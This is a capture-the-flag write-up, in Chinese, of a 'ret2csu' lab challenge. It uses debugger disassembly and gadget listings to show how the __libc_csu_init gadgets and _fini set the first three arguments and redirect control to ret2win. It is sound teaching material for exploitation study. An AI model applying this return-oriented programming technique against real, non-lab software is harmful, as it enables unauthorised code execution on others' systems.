> 1. The challenge is simple: call the ret2win() function
> 2. The third argument (rdx) must be 0xdeadcafebabebeef
> 3. There's no gadget such as `pop rdx`

<br>

## Reverse
根据题意，呼叫 ret2win()，并且第三个参数为 0xdeadcafebabebeef 即可。

<br>

## ROP Gadgets
用 ROPgadget 看一下，没有可用的 gadgets。
```
> ROPgadget --binary ret2csu | grep rdx
0x0000000000400567 : lea ecx, [rdx] ; and byte ptr [rax], al ; test rax, rax ; je 0x40057b ; call rax
0x000000000040056d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
```

<br>

## Return-to-csu
Video: [BlackHat Asia 2018 - return-to-csu: A New Method to Bypass 64-bit Linux ASLR](https://www.youtube.com/watch?v=mPbHroMVepM)

<br>

在 __libc_csu_init() 里面，我们可以找到两个很有用的 gadgets。
```
pwndbg> disas __libc_csu_init
Dump of assembler code for function __libc_csu_init:
   0x0000000000400840 <+0>:     push   r15
   0x0000000000400842 <+2>:     push   r14
   0x0000000000400844 <+4>:     mov    r15,rdx
   0x0000000000400847 <+7>:     push   r13
   0x0000000000400849 <+9>:     push   r12
   0x000000000040084b <+11>:    lea    r12,[rip+0x2005be]        # 0x600e10
   0x0000000000400852 <+18>:    push   rbp
   0x0000000000400853 <+19>:    lea    rbp,[rip+0x2005be]        # 0x600e18
   0x000000000040085a <+26>:    push   rbx
   0x000000000040085b <+27>:    mov    r13d,edi
   0x000000000040085e <+30>:    mov    r14,rsi
   0x0000000000400861 <+33>:    sub    rbp,r12
   0x0000000000400864 <+36>:    sub    rsp,0x8
   0x0000000000400868 <+40>:    sar    rbp,0x3
   0x000000000040086c <+44>:    call   0x400560 <_init>
   0x0000000000400871 <+49>:    test   rbp,rbp
   0x0000000000400874 <+52>:    je     0x400896 <__libc_csu_init+86>
   0x0000000000400876 <+54>:    xor    ebx,ebx
   0x0000000000400878 <+56>:    nop    DWORD PTR [rax+rax*1+0x0]
   0x0000000000400880 <+64>:    mov    rdx,r15
   0x0000000000400883 <+67>:    mov    rsi,r14
   0x0000000000400886 <+70>:    mov    edi,r13d
   0x0000000000400889 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x000000000040088d <+77>:    add    rbx,0x1
   0x0000000000400891 <+81>:    cmp    rbp,rbx
   0x0000000000400894 <+84>:    jne    0x400880 <__libc_csu_init+64>
   0x0000000000400896 <+86>:    add    rsp,0x8
   0x000000000040089a <+90>:    pop    rbx
   0x000000000040089b <+91>:    pop    rbp
   0x000000000040089c <+92>:    pop    r12
   0x000000000040089e <+94>:    pop    r13
   0x00000000004008a0 <+96>:    pop    r14
   0x00000000004008a2 <+98>:    pop    r15
   0x00000000004008a4 <+100>:   ret
End of assembler dump.
```

gadget1：
```
   0x0000000000400880 <+64>:    mov    rdx,r15
   0x0000000000400883 <+67>:    mov    rsi,r14
   0x0000000000400886 <+70>:    mov    edi,r13d
   0x0000000000400889 <+73>:    call   QWORD PTR [r12+rbx*8]
```

gadget2：
```
   0x000000000040089a <+90>:    pop    rbx
   0x000000000040089b <+91>:    pop    rbp
   0x000000000040089c <+92>:    pop    r12
   0x000000000040089e <+94>:    pop    r13
   0x00000000004008a0 <+96>:    pop    r14
   0x00000000004008a2 <+98>:    pop    r15
   0x00000000004008a4 <+100>:   ret
```

通过 gadget2 和 gadget1，我们可以控制 edi, rsi, rdx，也就是前三个参数。

至于 `r12 + rbx*8` 我们可以试着拼凑出一个指向 plt 或 got 中某条 entry 的 address。

<br>

## Pwn
但这题有个很坑的地方：在 GOT/PLT 中我们无法找到 ret2win() 的 entry，但是透过以下方法可以找到：
```
pwndbg> info address ret2win
Symbol "ret2win" is at 0x4007b1 in a file compiled without debugging.
```

我们只要想办法在内存某处，塞入这个 address 然后让 r12 + rbx*8 指向 address 所在的那个 qword 即可。

但是如果是在 stack 上，这肯定是不可行的，因为 ASLR = 1、2 时 stack 的位址是随机化的。

但这题有个很奇怪的点，不知道为什么 fgets() 输入的东西，居然会被映射在 heap 上某处！？？？

然后因为 PIE 没开启，只要 ASLR = 0 或 1，这题就可以轻松解决！

但这里不说这个，有兴趣自己试试看，我们说说比较可靠的解法。

<br>

到 *__libc_csu_init+73 的时候，会呼叫 [r12+rbx*8] 这个位址的 function，我们必须：
1. 不要 segfault
2. 不要动到 rdx
```
   0x0000000000400880 <+64>:    mov    rdx,r15
   0x0000000000400883 <+67>:    mov    rsi,r14
   0x0000000000400886 <+70>:    mov    edi,r13d
   0x0000000000400889 <+73>:    call   QWORD PTR [r12+rbx*8]
   0x000000000040088d <+77>:    add    rbx,0x1
   0x0000000000400891 <+81>:    cmp    rbp,rbx
   0x0000000000400894 <+84>:    jne    0x400880 <__libc_csu_init+64>
   0x0000000000400896 <+86>:    add    rsp,0x8
   0x000000000040089a <+90>:    pop    rbx
   0x000000000040089b <+91>:    pop    rbp
   0x000000000040089c <+92>:    pop    r12
   0x000000000040089e <+94>:    pop    r13
   0x00000000004008a0 <+96>:    pop    r14
   0x00000000004008a2 <+98>:    pop    r15
   0x00000000004008a4 <+100>:   ret
```

有个很好的对象可以呼叫，看看 _fini()：
```
pwndbg> disas _fini
Dump of assembler code for function _fini:
   0x00000000004008b4 <+0>:     sub    rsp,0x8
   0x00000000004008b8 <+4>:     add    rsp,0x8
   0x00000000004008bc <+8>:     ret
End of assembler dump.
```

在 .dynamic (dynamic section) 里记录了 _fini() 的真实位址：
```
pwndbg> x/10gx &_DYNAMIC
0x600e20:       0x0000000000000001      0x0000000000000001
0x600e30:       0x000000000000000c      0x0000000000400560
0x600e40:       0x000000000000000d      0x00000000004008b4 <--- _fini
（省略若干行）
```

所以我们只要让 r12+rbx*8 等于 0x600e48， 那么 qword ptr [r12+rbx*8] 就会等于 0x00000000004008b4。

但必须注意，在 call qword ptr [r12+rbx*8] 之后：
```
0x000000000040088d <+77>:    add    rbx,0x1
0x0000000000400891 <+81>:    cmp    rbp,rbx
0x0000000000400894 <+84>:    jne    0x400880 <__libc_csu_init+64>
```

我们可以让 rbx = 0，rbp = 1，这样 rbx += 1 之后就会和 rbp 相等，就不会 jne 0x400880。

接着就会继续执行后面几行：
```
0x0000000000400896 <+86>:    add    rsp,0x8
0x000000000040089a <+90>:    pop    rbx
0x000000000040089b <+91>:    pop    rbp
0x000000000040089c <+92>:    pop    r12
0x000000000040089e <+94>:    pop    r13
0x00000000004008a0 <+96>:    pop    r14
0x00000000004008a2 <+98>:    pop    r15
0x00000000004008a4 <+100>:   ret
```

要注意在 pop rbx 到 ret 之前，还有个 add rsp, 0x8！

所以这边开始需要 `7 * 'AAAAAAAA' + ret2win` 而不是 `6 * 'AAAAAAAA' + ret2win` (多垫一组 padding)
